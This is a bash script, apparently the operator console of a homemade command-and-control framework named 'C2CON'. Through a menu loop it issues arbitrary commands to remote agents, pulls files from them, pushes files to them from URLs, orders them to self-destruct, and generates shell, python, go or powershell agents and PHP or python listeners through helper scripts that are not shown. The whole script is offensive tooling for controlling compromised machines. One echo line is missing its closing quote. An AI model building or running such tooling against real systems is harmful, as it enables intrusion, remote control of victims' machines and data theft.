
while true
do
echo """
  ______ ___     ______   ______   .__   __. 
 /      |__ \   /      | /  __  \  |  \ |  | 
|  ,----'  ) | |  ,----'|  |  |  | |   \|  | 
|  |      / /  |  |     |  |  |  | |  . \`  | 
|  \`----./ /_  |  \`----.|  \`--'  | |  |\   | 
 \______|____|  \______| \______/  |__| \__| 
 
                 Started from the bottom, we keep diggin
"""
echo "Action ?"
read action

if [ "$action" = "run" ]; then
echo "Agent ?"
read agent
echo "Ze Juice ?"
read cmd
echo "$agent:$action:$cmd" >> /tmp/C2CON-cmds.txt
echo "Task to $agent => $action $cmd" >> /tmp/C2CON-res.txt
sleep 2
clear

elif [ "$action" = "kill_lis" ]; then
echo "Listener PID ?"
read PID
kill $PID
listname=$(cat /tmp/C2CON-listener.txt| grep ".$PID."  | cut -d '/' -f 2 | cut -d ' ' -f 1)
if [ -z "$listname" ]
then
echo "Can't find the listener folder"
else
rm -rf /tmp/$listname
fi
cat /tmp/C2CON-listener.txt | grep -v ".$PID." > /tmp/C2CON-templistener
cat /tmp/C2CON-templistener > /tmp/C2CON-listener.txt 
echo "Listener with $PID killed"
sleep 2
clear


elif [ "$action" = "kill_ag" ]; then
echo "Agent ?"
read agent
echo "Task Agent $agent to self-destruct >> /tmp/C2CON-res.txt
echo "$agent:kill" >> /tmp/C2CON-cmds.txt
sleep 2
clear

elif [ "$action" = "create" ]; then
echo "What ?"
read what

if [ "$what" = "agent" ]; then
echo "Type (shell/python/go/powershell) ?"
read type
echo "Filename ?"
read filename
echo "Endpoint ?"
read endpoint
echo "Mode Param ?"
read mode_param
echo "Reponse Param ?"
read resp_param
echo "Creating agent"
bash create_agent.sh  $type $filename $endpoint $mode_param $resp_param
sleep 2
clear



elif [ "$what" = "listener" ]; then
	echo "Type ?"
	read type
	if [ "$type" = "php" ]; then
		echo "Endpoint ?"
		read endpoint
		echo "Mode Param ?"
		read mode_param
		echo "Reponse Param ?"
		read resp_param
		echo "Creating and deploying listener"
		bash create_listener.sh $type $endpoint $mode_param $resp_param
		sleep 2
		clear

	elif [ "$type" = "python" ]; then
		echo "Endpoint ?"
		read endpoint
		echo "Mode Param ?"
		read mode_param
		echo "Reponse Param ?"
		read resp_param
		echo "Listener Port ?"
		read port
		bash create_listener.sh $type $endpoint $mode_param $resp_param $port&
		sleep 2
		clear
	else
		echo "Create listener python or php"
		sleep 2
		clear
	fi	
else
echo "Create agent or listener"
sleep 2
clear


fi


elif [ "$action" = "download" ]; then
echo "Agent ?"
read agent
echo "Ze File ?"
read file
echo "$agent:$action:$file" >> /tmp/C2CON-cmds.txt
echo "Task to $agent => $action $file" >> /tmp/C2CON-res.txt
sleep 2
clear


elif [ "$action" = "upload" ]; then
echo "Agent ?"
read agent
echo "URL ?"
read url
echo "Path ?"
read path
echo "$agent:$action:$url:$path" >> /tmp/C2CON-cmds.txt
echo "Task to $agent => $action $url to $path" >> /tmp/C2CON-res.txt
sleep 2
clear


elif [ "$action" = "clear" ]; then
echo "file?"
read file

if [ "$file" = "cmds" ]; then
echo "" > /tmp/C2CON-cmds.txt
sleep 2
echo "Clearing /tmp/C2CON-cmds.txt"
clear


elif [ "$file" = "res" ]; then
echo "" > /tmp/C2CON-res.txt
sleep 2
echo "Clearing C2CON-res.txt"
clear

elif [ "$file" = "listeners" ]; then
echo "" > /tmp/C2CON-listener.txt
sleep 2
echo "Clearing C2CON-listener.txt"
clear

elif [ "$file" = "ping" ]; then
echo "Clearing C2CON-ping.txt"
echo "" > /tmp/C2CON-ping.txt
sleep 2
clear

elif [ "$file" = "all" ]; then
echo "Clearing all txt"
echo "" > /tmp/C2CON-ping.txt
echo "" > /tmp/C2CON-listener.txt
echo "" > /tmp/C2CON-res.txt
echo "" > /tmp/C2CON-cmds.txt
sleep 2
clear

else
echo "Unknown file"
sleep 2
clear
fi

else
echo "Unknown cmd"
sleep 2
clear
fi

done
